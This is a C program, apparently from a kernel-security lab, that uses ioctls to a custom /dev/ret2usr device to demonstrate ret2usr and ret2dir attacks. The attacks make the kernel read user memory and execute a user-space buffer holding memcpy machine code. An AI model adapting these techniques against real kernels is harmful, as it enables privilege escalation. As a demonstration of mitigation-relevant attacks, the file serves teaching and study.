#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include "ret2usr.h"

char DATA_BUF[] = "!!! data from userspace !!!";

/*
 * This is the kernel's implementation of memcpy (arch/x86/lib/memcpy_64.S):
 * void memcpy(void *dst, const void *src, size_t len)
 */
unsigned char CODE_BUF[] = {
	0x48, 0x89, 0xf8,	/* mov    rax,rdi */
	0x48, 0x89, 0xd1,	/* mov    rcx,rdx */
	0x48, 0xc1, 0xe9, 0x03,	/* shr    rcx,0x3 */
	0x83, 0xe2, 0x07,	/* and    edx,0x7 */
	0xf3, 0x48, 0xa5,	/* rep movs QWORD PTR es:[rdi],
				   QWORD PTR ds:[rsi] */
	0x89, 0xd1,		/* mov    ecx,edx */
	0xf3, 0xa4,		/* rep movs BYTE PTR es:[rdi],
				   BYTE PTR ds:[rsi] */
	0xc3,			/* ret */
};

void print_req(struct ret2usr_req *req)
{
	printf("status:    %d (%s)\n", req->status, strerror(-req->status));
	printf("user_addr: %016lx\n", req->user_addr);
	printf("phys_addr: %016lx\n", req->phys_addr);
	printf("kern_addr: %016lx\n", req->kern_addr);
	printf("len:       %d\n", req->len);
	printf("data:      %s\n", req->data);

	if (req->status)
		printf("EXPLOIT FAILED!\n");
	else
		printf("EXPLOIT SUCCEEDED!\n");
}

/* 4k page size */
#define PAGE_SHIFT	12
#define PAGE_SIZE	(1UL << PAGE_SHIFT)
#define PAGE_MASK	(~(PAGE_SIZE-1))

int main(int argc, char *argv[])
{
	int i, fd;
	struct ret2usr_req req;
	void *tmp;
	unsigned char *code_buf;

	/*
	 * Allocate a page aligned code buffer so it can be marked 'executable'
	 * with mprotect().
	 */
	tmp = malloc(sizeof(CODE_BUF) + PAGE_SIZE - 1);
	if (!tmp) {
		fprintf(stderr, "*** failed to allocate memory (%s)\n",
			strerror(errno));
		return 1;
	}
	code_buf = (unsigned char *)(((unsigned long)tmp + PAGE_SIZE - 1) &
				     PAGE_MASK);
	if (mprotect((void *)code_buf, sizeof(CODE_BUF), PROT_READ |
		     PROT_WRITE | PROT_EXEC) < 0) {
		fprintf(stderr, "*** failed to set mprotect memory (%s)\n",
			strerror(errno));
		goto err_free;
	}
	memcpy((void *)code_buf, (void *)CODE_BUF, sizeof(CODE_BUF));

	printf("\n");
	printf("pid of current process:         %d\n", getpid());
	printf("virtual address of data buffer: %016lx\n",
	       (unsigned long)DATA_BUF);
	printf("size of data buffer:            %lu\n", sizeof(DATA_BUF));
	printf("content of data buffer:         %s\n", DATA_BUF);
	printf("virtual address of code buffer: %016lx\n",
	       (unsigned long)code_buf);
	printf("size of code buffer:            %lu\n", sizeof(CODE_BUF));
	printf("content of code buffer:         ");
	for (i = 0; i < sizeof(CODE_BUF); i++)
		printf("%02x ", code_buf[i]);
	printf("\n");

	fd = open("/dev/ret2usr", O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "*** failed to open /dev/ret2usr\n");
		goto err_free;
	}

	/* ret2usr read exploit -------------------------------------------- */

	memset(&req, 0, sizeof(req));
	req.user_addr = (unsigned long)DATA_BUF;
	req.len = sizeof(DATA_BUF);

	printf("\n++++++++ ret2usr (read) ++++++++\n");
	if (ioctl(fd, RET2USR_READ, &req) < 0)
		goto err_close;
	print_req(&req);

	/* ret2dir read exploit -------------------------------------------- */

	memset(&req, 0, sizeof(req));
	req.user_addr = (unsigned long)DATA_BUF;
	req.len = sizeof(DATA_BUF);

	printf("\n++++++++ ret2dir (read) ++++++++\n");
	if (ioctl(fd, RET2DIR_READ, &req))
		goto err_close;
	print_req(&req);

	/* ret2usr code execution exploit ---------------------------------- */

	memset(&req, 0, sizeof(req));
	req.user_addr = (unsigned long)code_buf;
	req.len = sizeof(CODE_BUF);

	printf("\n++++++++ ret2usr (exec) ++++++++\n");
	if (ioctl(fd, RET2USR_EXEC, &req) < 0)
		goto err_close;
	print_req(&req);

	/* ret2dir code execution exploit ---------------------------------- */

	memset(&req, 0, sizeof(req));
	req.user_addr = (unsigned long)code_buf;
	req.len = sizeof(CODE_BUF);

	printf("\n++++++++ ret2dir (exec) ++++++++\n");
	if (ioctl(fd, RET2DIR_EXEC, &req) < 0)
		goto err_close;
	print_req(&req);

	printf("\n");
	close(fd);
	free(tmp);
	return 0;

err_close:
	fprintf(stderr, "*** failed to execute ioctl command\n");
	close(fd);
err_free:
	free(tmp);
	return 1;
}
